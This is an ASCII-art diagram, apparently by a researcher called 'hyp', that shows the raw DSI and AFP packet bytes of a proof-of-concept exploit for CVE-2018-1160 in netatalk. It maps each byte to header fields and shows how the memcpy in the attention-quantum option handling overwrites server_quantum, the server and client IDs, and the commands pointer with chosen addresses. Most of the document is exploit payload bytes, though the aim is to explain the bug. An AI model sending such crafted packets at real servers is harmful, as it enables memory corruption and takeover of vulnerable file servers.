
╒═════════════════════════════════════════════════════════════════════════╕
│            Example DSI + AFP packets as a CVE-2018–1160 PoC             │
│                                                                         │
│                   Based on the following article:                       │
│                                                                         │
│ https://medium.com/@kevin.massey1189/cve-2018-1160-writeup-936b5e3b3cf2 │
│                                                                         │
│                               by hyp                                    │
╘═════════════════════════════════════════════════════════════════════════╛


────────────────┐ 
\x00\x04\x41\x41│  ──────────────────────────────────┐      
\x00\x00\x00\x00│  ──────────────────────────────────┼─┐
\x00\x00\x00\x1a│  ──────────────────────────────────┼─┼─┐ 
\x00\x00\x00\x00│  ──────────────────────────────────┼─┼─┼─┐ 
┌───────────────┘                                    │ │ │ │
└───────┐             ┌─────────┬─────────┐          │ │ │ │
\x01\x18└───────┐     │   Type  │ Length  │          │ │ │ │
\x00\x00\x40\x00│     ├─────────┴─────────┤ <────────┼─┼─┼─┼──────┐
\x00\x00\x00\x00│     │      Option       │          │ │ │ │      │
                │     └───────────────────┘          │ │ │ │      │
                │                                    │ │ │ │      │
\xef\xbe\xad\xde│                                    │ │ │ │      │
\xbe\xba\xfe\xca└───────────────┐                    │ │ │ │      │ 
\x20\x9a\x5a\x55\x55\x55\x00\x00│                    │ │ │ │      │
┌───────────────────────────────┘                    │ │ │ │      │
│typedef struct DSI {                                │ │ │ │      │
│	  ...                                              │ │ │ │      │
│   uint32_t attn_quantum, datasize, server_quantum; │ │ │ │      │
│	  uint16_t serverID, clientID;                     │ │ │ │      │
│	  uint8_t  *commands;                              │ │ │ │      │
│	  uint8_t  data[DSI_DATASIZ];                      │ │ │ │      │
│   ...                                              │ │ │ │      │
│}                                                   │ │ │ │      │
│                                                    │ │ │ │      │
│ 0xdeadbeef -> server_quantum                       │ │ │ │      │ 
│ 0xcafebabe -> serverID, ClientID                   │ │ │ │      │
│ 0x005555555a9a2c -> *commands                      │ │ │ │      │          
│       0000  0000 000000                            │ │ │ │      │
└─────┐ 0   0 0      00                              │ │ │ │      │
┌─────┘ 0   0 0000   00                              │ │ │ │      │
│       0   0    0   00                              │ │ │ │      │
│       00 0  0000 000000                            │ │ │ │      │
│ ┌─────────┬─────────┬────────────────┐             │ │ │ │      │
│ │  Flags  │ Command │     Req ID     │ <──┬────────┘ │ │ │      │
│ ├─────────┴─────────┴────────────────┤    │          │ │ │      │
│ │              Error Code            │ <──┼─┬────────┘ │ │      │
│ ├────────────────────────────────────┤    │ │          │ │      │
│ │              Length                │ <──┼─┼─┬────────┘ │      │
│ ├────────────────────────────────────┤    │ │ │          │      │
│ │              Reserved              │ <──┼─┼─┼─┬────────┘      │
│ ├────────────────────────────────────┤    │ │ │ │               │
│ │              Payload               ├────┼─┼─┼─┼───────────────┘
│ └────────────────────────────────────┘    │ │ │ │
│                                           │ │ │ │
└───────────────┐                           │ │ │ │
\x00\x02\x41\x41│ ──────────────────────────┘ │ │ │                         
\x00\x00\x00\x00│ ────────────────────────────┘ │ │                          
\x00\x00\x00\x10│ ──────────────────────────────┘ │                           
\x00\x00\x00\x00│ ────────────────────────────────┘                            
┌───────────────┘                             
│while (i < dsi->cmdlen) {
│	  switch (dsi->commands[i++]) {
│ 
│ 		  case DSIOPT_ATTNQUANT:   <──────────────────────────────────┐
│   		    memcpy(&dsi->attn_quantum, dsi->commands + i + 1,       │
│           	  dsi->commands[i]);     ┴────────────────────┴──┐    │
│   		                                                       │    │
│   		    dsi->attn_quantum = ntohl(dsi->attn_quantum);      │    │
│   	  ...                                                    │    │
│	  }                                                          │    │
│}                                                             │    │
│                                                              │    │
│    00     00000 00000                                        │    │
│   0  0    0     0   0                                        │    │
│  000000   0000  00000                                        │    │
│ 0      0  0     0                                            │    │
│0        0 0     0                                            │    │
└───────┐                                                      │    │
\x01\x00└───────────────┬──────────────────────────────────────┼────┘
\x00\x00\x00\x00\x00\x00└───────┐                              │
\xa0\x63\x58\x55\x55\x55\x00\x00│                              │  
────────────────────────────────┴──────────────────────────────┘

